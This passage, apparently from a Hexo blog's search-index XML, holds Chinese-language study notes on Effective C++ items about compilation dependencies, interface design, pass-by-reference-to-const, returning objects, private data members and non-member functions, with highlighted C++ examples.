class="line">std::<span class="function">tr1::shared_ptr&lt;Person&gt; <span class="title">Person::create</span><span class="params">(<span class="type">const</span> std::string&amp; name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                            <span class="type">const</span> Date&amp; birthday,</span></span></span><br><span class="line"><span class="params"><span class="function">                                            <span class="type">const</span> Address&amp; addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> std::tr1::<span class="built_in">shared_ptr</span>&lt;Person&gt;(<span class="keyword">new</span> <span class="built_in">RealPerson</span>(name, birthday,addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person::create 的一个更现实的实现会创建不同派生类型的对象，依赖于诸如，其他函数的参数值，从文件或数据库读出的数据，环境变量等等。</p><p>至于Interface classes, 由千每个函数都是virtual, 所以你必须为每次函数调用付出一个间接跳跃(indirect jump) 成本（见条款7) 。此外Interface class 派生的对象必须内含一个vptr (virtual table pointer, 再次见条款7) ，这个指针可能会增加存放对象所需的内存数量一实际取决于这个对象除了Interface class 之外是否还有其他virtual 函数来源。</p><h4 id="others"><a href="#others" class="headerlink" title="others"></a>others</h4><ul><li><p>如果使用object references 或object pointers 可以完成任务，就不要使用objects 。你可以只靠一个类型声明式就定义出指向该类型的references 和pointers: 但如果定义某类型的objects, 就需要用到该类型的定义式。</p></li><li><p>如果能够，尽量以class 声明式替换class 定义式。注意，当你声明一个函数而它用到某个class 时，你并不需要该class 的定义；纵使函数以by value 方式传递该类型的参数（或返回值）亦然：</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span>; <span class="comment">// 类声明。</span></span><br><span class="line"><span class="function">Date <span class="title">today</span><span class="params">()</span></span>; <span class="comment">// 函数声明。此处不需要提供详细信息。</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clearAppointrnents</span><span class="params">(Date d)</span></span>; <span class="comment">// 需要 Date 的定义。</span></span><br></pre></td></tr></table></figure><ul><li>为声明式和定义式提供不同的头文件</li></ul><p>我们可以通过<code>#include</code>头文件来代替手工前置声明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;datefwd.h&quot;</span>       </span></span><br><span class="line"><span class="function">Date <span class="title">today</span><span class="params">()</span></span>;                  </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clearAppointments</span><span class="params">(Date d)</span></span></span><br></pre></td></tr></table></figure><ul><li>C++提供export关键词，允许将template声明式和template 定义式分割</li></ul><h4 id="请记住-5"><a href="#请记住-5" class="headerlink" title="请记住"></a>请记住</h4><ul><li>支持“<code>编译依存性最小化</code>”的一般构想是：相依千声明式，不要相依于定义式。基于此构想的两个手段是Handle classes 和Interface classes 。</li><li>程序库头文件应该以“完全且仅有声明式”(full and declaration-only forms) 的形式存在。这种做法不论是否涉及templates 都适用。</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://wizardforcel.gitbooks.io/effective-cpp/content/0.html">Preface（前言） | Effective C++ (gitbooks.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> effective cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> effective cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EffectiveCpp0x4</title>
      <link href="/2024/04/17/C&amp;C++/Effective%20Cpp0x4/"/>
      <url>/2024/04/17/C&amp;C++/Effective%20Cpp0x4/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="Designs-and-Declarations"><a href="#Designs-and-Declarations" class="headerlink" title="Designs and Declarations"></a>Designs and Declarations</h1><h3 id="18-Make-interfaces-easy-to-use-correctly-and-hard-to-use-incorrectly"><a href="#18-Make-interfaces-easy-to-use-correctly-and-hard-to-use-incorrectly" class="headerlink" title="18. Make  interfaces easy to use correctly and hard to use incorrectly"></a>18. Make  interfaces easy to use correctly and hard to use incorrectly</h3><ul><li>欲开发一个“容易被正确使用，不容易被误用”的接口，首先必须考虑客户可能做出什么样的错误。</li></ul><p>类型系统是我们的同盟国</p><p>通过一下设计可以避免由于不同国家日期表示方式的区别而产生的错误。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Day</span> &#123;            <span class="keyword">struct</span> <span class="title class_">Month</span> &#123;                <span class="keyword">struct</span> <span class="title class_">Year</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Day</span><span class="params">(<span class="type">int</span> d)</span>     <span class="keyword">explicit</span> <span class="title">Month</span><span class="params">(<span class="type">int</span> m)</span>         <span class="keyword">explicit</span> <span class="title">Year</span><span class="params">(<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function">  :val(d) &#123;</span>&#125;              :<span class="built_in">val</span>(m) &#123;&#125;                    :<span class="built_in">val</span>(y)&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> val;                <span class="type">int</span> val;                      <span class="type">int</span> val;</span><br><span class="line">&#125;;                      &#125;;                            &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> <span class="built_in">Date</span>(<span class="type">const</span> Month&amp; m, <span class="type">const</span> Day&amp; d, <span class="type">const</span> Year&amp; y);</span><br><span class="line"> ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">Date <span class="title">d</span><span class="params">(<span class="number">30</span>, <span class="number">3</span>, <span class="number">1995</span>)</span></span>;                      <span class="comment">// error! wrong types</span></span><br><span class="line"></span><br><span class="line"><span class="function">Date <span class="title">d</span><span class="params">(Day(<span class="number">30</span>), Month(<span class="number">3</span>), Year(<span class="number">1995</span>))</span></span>;    <span class="comment">// error! wrong types</span></span><br><span class="line"></span><br><span class="line"><span class="function">Date <span class="title">d</span><span class="params">(Month(<span class="number">3</span>), Day(<span class="number">30</span>), Year(<span class="number">1995</span>))</span></span>;    <span class="comment">// okay, types are correct</span></span><br></pre></td></tr></table></figure><p>这里使用函数代替对象，因为你非局部静态对象（non-local static objects）的初始化的可靠性是值得怀疑的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Month</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> Month <span class="title">Jan</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Month</span>(<span class="number">1</span>); &#125;   <span class="comment">// functions returning all valid</span></span><br><span class="line">  <span class="function"><span class="type">static</span> Month <span class="title">Feb</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Month</span>(<span class="number">2</span>); &#125;   <span class="comment">// Month values; see below for</span></span><br><span class="line">  ...                                       <span class="comment">// why these are functions, not</span></span><br><span class="line">  <span class="function"><span class="type">static</span> Month <span class="title">Dec</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Month</span>(<span class="number">12</span>); &#125;  <span class="comment">// objects</span></span><br><span class="line"></span><br><span class="line">  ...                                       <span class="comment">// other member functions</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Month</span><span class="params">(<span class="type">int</span> m)</span></span>;                    <span class="comment">// prevent creation of new</span></span><br><span class="line">                                            <span class="comment">// Month values</span></span><br><span class="line"></span><br><span class="line">  ...                                       <span class="comment">// month-specific data</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">Date <span class="title">d</span><span class="params">(Month::Mar(), Day(<span class="number">30</span>), Year(<span class="number">1995</span>))</span></span>;</span><br></pre></td></tr></table></figure><p>书中说<code>enum</code>不具有类型安全性，我试了下<code>msvc</code>和<code>g++</code>都会报错，且C++11引入了<code>作用域枚举</code>来避免这一问题，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Month</span> &#123;</span><br><span class="line">    January,</span><br><span class="line">    February,</span><br><span class="line">    March,</span><br><span class="line">    April,</span><br><span class="line">    May,</span><br><span class="line">    June,</span><br><span class="line">    July,</span><br><span class="line">    August,</span><br><span class="line">    September,</span><br><span class="line">    October,</span><br><span class="line">    November,</span><br><span class="line">    December</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Month m = Month::January;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用枚举值时，只能使用合法的枚举成员，确保类型安全性</span></span><br><span class="line">    <span class="keyword">if</span> (m == Month::January) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;It&#x27;s January&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;It&#x27;s not January&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="others"><a href="#others" class="headerlink" title="others"></a>others</h4><ul><li>为调用者提供行为一致的接口，如每个STL容器都有一个名为size的成员函数</li><li><p>令返回指针的函数强制返回智能指针，解决指针使用问题</p></li><li><p><code>cross-DLL problem</code>一个对象在一个动态链接库（dynamically linked library (DLL)）中通过 new 被创建，在另一个不同的 DLL 中被删除。</p></li><li>由于2</li></ul><h4 id="请记住"><a href="#请记住" class="headerlink" title="请记住"></a>请记住</h4><ul><li>好的接口易于正确使用，而难以错误使用。你应该在你的所有接口中为这个特性努力。</li><li>使易于正确使用的方法包括在接口和行为兼容性上与内建类型保持一致。</li><li>预防错误的方法包括创建新的类型，限定类型的操作，约束对象的值，以及消除客户的资源管理职责。</li><li><code>std::shared_ptr</code> 支持自定义<code>deleter</code>。这可以防止<code>cross-DLL</code> 问题，能用于自动解锁互斥锁等。</li></ul><h3 id="Treat-class-design-as-type-design"><a href="#Treat-class-design-as-type-design" class="headerlink" title="Treat class design as type design"></a>Treat class design as type design</h3><ul><li>你的新类型的对象应该<code>如何创建和销毁</code>？如何做这些将影响到你的类的构造函数和析构函数，以及内存分配和回收的函数（operator new，operator new[]，operator delete，和 operator delete[] ——参见 Chapter 8）的设计，除非你不写它们。</li><li>对象的初始化和对象的赋值应该有什么不同？这个问题的答案决定了你的构造函数和你的赋值运算符的行为和它们之间的不同。这对于<code>不混淆初始化和赋值</code>是很重要的，因为它们相当于不同的函数调用（参见 Item 4）。</li><li>以值传递（passed by value）对于你的新类型的对象意味着什么？记住，<code>拷贝构造函数</code>定义了一个<code>新类型的传值（pass-by-value）</code>如何实现。</li><li>你的<code>新类型的合法值的限定条件</code>是什么？通常，对于一个类的数据成员来说，仅有某些值的组合是合法的。那些组合决定了你的类必须维持的不变量。这些不变量决定了你必须在成员函数内部进行错误检查，特别是你的构造函数，赋值运算符，以及 “setter” 函数。它可能也会影响你的函数抛出的异常，以及你的函数的异常规范（exception specification）（你用到它的可能性很小）。</li><li>你的新类型是否适合放进一个继承图表中？如果你从已经存在的类继承，你将被那些类的设计所约束，特别是它们的函数是<code>virtual</code>还是 <code>non-virtual</code>（参见 Item 34 和 36）。如果你希望允许其他类继承你的类，将影响到你是否将函数声明为 virtual，特别是你的析构函数（参见 Item 7）。</li><li>你的新类型允许哪种类型转换？你的类型身处其它类型的海洋中，所以是否要在你的类型和其它类型之间有一些转换？<code>如果你希望允许 T1 类型的对象隐式转型为 T2 类型的对象，你就要么在 T1 类中写一个类型转换函数（例如，operator T2），要么在 T2 类中写一个非显式的构造函数，而且它们都要能够以单一参数调用</code>。如果你希望仅仅允许显示转换，你就要写执行这个转换的函数，而且你还需要避免使它们的类型转换运算符或非显式构造函数能够以一个参数调用。（作为一个既允许隐式转换又允许显式转换的例子，参见 Item 15。）</li><li>对于新类型哪些运算符和函数有意义？这个问题的答案决定你应该为你的<code>类声明哪些函数</code>。其中一些是成员函数，另一些不是（参见 Item 23、24 和 46）。</li><li>哪些标准函数不应该被接受？你需要将那些都声明为 private（参见 Item 6）。</li><li>你的新类型中<code>哪些成员可以被访问</code>？这个问题的可以帮助你决定哪些成员是 public，哪些是 protected，以及哪些是 private。它也可以帮助你决定哪些类和函数应该是友元，以及一个类嵌套在另一个类内部是否有意义。</li><li><code>什么是你的新类型的 &quot;undeclared interface&quot;</code>？它对于性能考虑，异常安全（exception safety）（参见 Item 29），以及资源使用（例如，锁和动态内存）提供哪种保证？你在这些领域提供的保证将强制影响你的类的实现。</li><li>你的新类型有多大程度的<code>通用性</code>？也许你并非真的要定义一个新的类型。也许你要定义一个整个的类型家族。如果是这样，你不需要定义一个新的类，而是需要定义一个新的<code>类模板</code>。</li><li><code>一个新的类型真的是你所需要的吗</code>？是否你可以仅仅定义一个新的继承类，以便让你可以为一个已存在的类增加一些功能，也许通过简单地定义一个或更多非成员函数或模板能更好地达成你的目标。</li></ul><h4 id="请记住-1"><a href="#请记住-1" class="headerlink" title="请记住"></a>请记住</h4><ul><li>类设计就是类型设计。定义一个新类型之前，确保考虑了本 Item 讨论的所有问题。</li></ul><h3 id="20-prefer-pass-by-reference-to-const-to-pass-by-value"><a href="#20-prefer-pass-by-reference-to-const-to-pass-by-value" class="headerlink" title="20. prefer pass-by-reference-to-const to pass-by-value"></a>20. prefer pass-by-reference-to-const to pass-by-value</h3><ul><li>缺省情况下是以pass-by-value传递对象到函数，即除非你额外指定，函数参数都是实际参数的副本，调用端获得函数返回值的副本</li></ul><ol><li><code>pass-by-reference-to-const</code>可以提高运行速度，避免不必要的构造和析构函数</li></ol><ol><li><code>pass-by-reference-to-const</code></li></ol><ul><li>一个纯粹的基类的 Window 对象的显示方法有可能不同于专门的 <code>WindowWithScrollBars</code>对象的显示方法（参见 Item 34 和 36）。</li><li>我们想打印窗口，当以<code>(window w)</code>为参数传递，则会构造一个临时的<code>window</code>对象然后打印，若传入对象为<code>WindowWithScrollBars</code>，会造成<code>slicing（对象切割）</code>，所有特化信息都会被切除。显然，这不是我们想要的结果。</li><li>当以<code>(const Window&amp; w)</code>传入参数，那么传入的是什么类型，传出的就是什么类型。</li><li>通常<code>reference</code>用指针表现，<code>pass-by-reference</code>意味着传递的是指针。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Window</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function">std::string <span class="title">name</span><span class="params">()</span> <span class="type">const</span></span>;           <span class="comment">// return name of window</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span> <span class="type">const</span></span>;       <span class="comment">// draw window and contents</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WindowWithScrollBars</span>: <span class="keyword">public</span> Window &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printNameAndDisplay</span><span class="params">(Window w)</span>         <span class="comment">// incorrect! parameter</span></span></span><br><span class="line"><span class="function"></span>&#123;                                          <span class="comment">// may be sliced!</span></span><br><span class="line">  std::cout &lt;&lt; w.<span class="built_in">name</span>();</span><br><span class="line">  w.<span class="built_in">display</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">WindowWithScrollBars wwsb;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printNameAndDisplay</span>(wwsb);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printNameAndDisplay</span><span class="params">(<span class="type">const</span> Window&amp; w)</span>   <span class="comment">// fine, parameter won&#x27;t</span></span></span><br><span class="line"><span class="function"></span>&#123;                                           <span class="comment">// be sliced</span></span><br><span class="line">  std::cout &lt;&lt; w.<span class="built_in">name</span>();</span><br><span class="line">  w.<span class="built_in">display</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>如果你有个对象属于内置类型（例如int), pass by value 往往比pass by reference 的效率高些。</li><li>对象小并不就意味其copy 构造函数不昂贵。许多对象,包括大多数STL 容器内含的东西只比一个指针多一些，但复制这种对象却需承担“复制那些指针所指的每一样东西＂。</li><li></li></ul><h4 id="请记住-2"><a href="#请记住-2" class="headerlink" title="请记住"></a>请记住</h4><ul><li>尽量用<code>pass-by-reference-to-const</code>替代 <code>pass-by-value</code>。典型情况下它更高效而且可以避免<code>对象切割问题</code>。</li><li>这条规则并不适用于内建类型及 STL 中的迭代器和函数对象类型。对于它们，<code>pass-by-value</code>通常更合适。</li></ul><h3 id="21-Don’t-try-to-return-a-reference-when-you-must-return-an-object"><a href="#21-Don’t-try-to-return-a-reference-when-you-must-return-an-object" class="headerlink" title="21.  Don’t try to return a reference when you must return an object."></a>21.  Don’t try to return a reference when you must return an object.</h3><ul><li><code>任何时候看到一个reference 声明式，你都应该立刻问自己，它的另一个名称是什么？</code></li><li>不要返回<code>pointer</code> 或<code>reference</code> 指向一个<code>local stack</code>对象,因为返回后该对象即销毁。</li><li>不要返回<code>reference</code>指向一个<code>heap-allocated</code>对象：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Rational&amp; <span class="keyword">operator</span>* (<span class="type">const</span> Rational&amp; lhs, <span class="type">const</span> Rational&amp; rhs)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//警告！更糟的写法</span></span><br><span class="line">Rational* result= <span class="keyword">new</span> <span class="built_in">Rational</span>(lhs.n * rhs.n, lhs.d * rhs.d);</span><br><span class="line"><span class="keyword">return</span> *result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Rational w, x, y, z;</span><br><span class="line">W = x * y * z; <span class="comment">//与operator*(operator*(x, y), z) 相同</span></span><br><span class="line"><span class="comment">//在这种情况下，new了两次因此我们需要delete两次对象</span></span><br></pre></td></tr></table></figure><ul><li>返回<code>pointer</code>或<code>reference</code>指向一个<code>local static</code> 对象而有可能同时需要多个这样的对象。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Rational&amp; <span class="keyword">operator</span>* (<span class="type">const</span> Rational&amp; lhs,<span class="type">const</span> Rational&amp; rhs)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> Rational result;</span><br><span class="line">result =... ;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> Rational&amp; <span class="keyword">operator</span>== (<span class="type">const</span> Rational&amp; lhs,<span class="type">const</span> Rational&amp; rhs)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Rational a,b,c,d;</span><br><span class="line"><span class="keyword">if</span>(a*b = c*d)<span class="comment">//if(operator==(operator(a,b),operator(c,d))</span></span><br><span class="line"></span><br><span class="line">则<span class="keyword">if</span>语句将永远为真，因为调用端看到的永远是<span class="type">static</span> Rational的现值</span><br></pre></td></tr></table></figure><ul><li>因此一个“必须返回新对象”的函数的正确写法是：就让那个函数返回一个新对象呗。相信编译器会让它执行的很快</li></ul><h4 id="请记住-3"><a href="#请记住-3" class="headerlink" title="请记住"></a>请记住</h4><p>绝不要返回<code>pointer</code> 或<code>reference</code> 指向一个<code>local stack</code>对象，或返回<code>reference</code>指向一个<code>heap-allocated</code>对象，或返回<code>pointer</code>或<code>reference</code>指向一个<code>local static</code> 对象而有可能同时需要多个这样的对象。条款4 已经为“在单线程环境中合理返回reference指向一个local static 对象”提供了一份设计实例。</p><h3 id="22-Declare-data-members-private"><a href="#22-Declare-data-members-private" class="headerlink" title="22. Declare data members private."></a>22. Declare data members private.</h3><ul><li>如果成员变量不是public，那么客户唯一能访问对象的方法就是通过成员函数。</li><li>通过成员函数访问<code>private</code>成员变量，可以实现多种访问权限</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AccessLevels</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getReadOnly</span><span class="params">()</span> <span class="type">const</span>        </span>&#123; <span class="keyword">return</span> readOnly; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">setReadWrite</span><span class="params">(<span class="type">int</span> value)</span>   </span>&#123; readWrite = value; &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getReadWrite</span><span class="params">()</span> <span class="type">const</span>       </span>&#123; <span class="keyword">return</span> readWrite; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">setWriteOnly</span><span class="params">(<span class="type">int</span> value)</span>   </span>&#123; writeOnly = value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> noAccess;                         <span class="comment">// no access to this int</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> readOnly;                         <span class="comment">// read-only access to this int</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> readWrite;                        <span class="comment">// read-write access to this int</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> writeOnly;                        <span class="comment">// write-only access to this int</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>将成员变量声明为<code>private</code>可以提供封装性。</p></li><li><p>从封装的角度观之，只有两种访问权限：<code>private(提供封装)</code>和<code>protect(不提供封装)</code></p></li></ul><h4 id="请记住-4"><a href="#请记住-4" class="headerlink" title="请记住"></a>请记住</h4><ul><li>切记将成员变量声明为private 。这可赋予客户访问数据的一致性、可细微划分访问控制、允诺约束条件获得保证，并提供class 作者以充分的实现弹性。</li><li>protected 并不比public 更具封装性。</li></ul><h3 id="23-Prefer-non-member-non-friend-functions-to-member-functions"><a href="#23-Prefer-non-member-non-friend-functions-to-member-functions" class="headerlink" title="23. Prefer non-member non-friend functions to member functions."></a>23. Prefer non-member non-friend functions to member functions.</h3><ul><li>封装：如果某些东西被封装，它就不再可见。愈多东西被封装，愈少人可以看到它。而愈少人看到它，我们就有愈大的弹性去变化它，因为我们的改变仅仅直接影响看到改变的那些人事物。这就是我们首先推崇封装的原因：它使我们能够<code>改变事物而只影响有限客户</code>。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WebBrowser</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">clearCache</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">clearHistory</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">removeCookies</span><span class="params">()</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//很多用户希望能一起执行全部这些动作，所以 WebBrowser 可能也会提供一个函数去这样做：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebBrowser</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">clearEverything</span><span class="params">()</span></span>;               <span class="comment">// calls clearCache, clearHistory,</span></span><br><span class="line">                                        <span class="comment">// and removeCookies</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当然，这个功能也能通过非成员函数调用适当的成员函数来提供：</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clearBrowser</span><span class="params">(WebBrowser&amp; wb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  wb.<span class="built_in">clearCache</span>();</span><br><span class="line">  wb.<span class="built_in">clearHistory</span>();</span><br><span class="line">  wb.<span class="built_in">removeCookies</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>有点反直觉的是：<code>member 函数clearEverything</code>带来的封装性比<code>non-member 函数clearBrowser 低</code>。因为<code>member函数</code>能访问到类的<code>private</code>变量。</li><li>提供<code>non-member non-friend</code>函数可允许对<code>WebBrowser</code> 相关机能有较大的包裹弹性(packaging flexibility), 而那最终导致较低的编译相依度。</li></ul><p>在c++，比较常用的做法是让<code>non-member函数</code>和<code>类</code>放在同一个<code>命名空间</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> WebBrowserStuff &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">WebBrowser</span> &#123; ... &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="type">void</span> <span 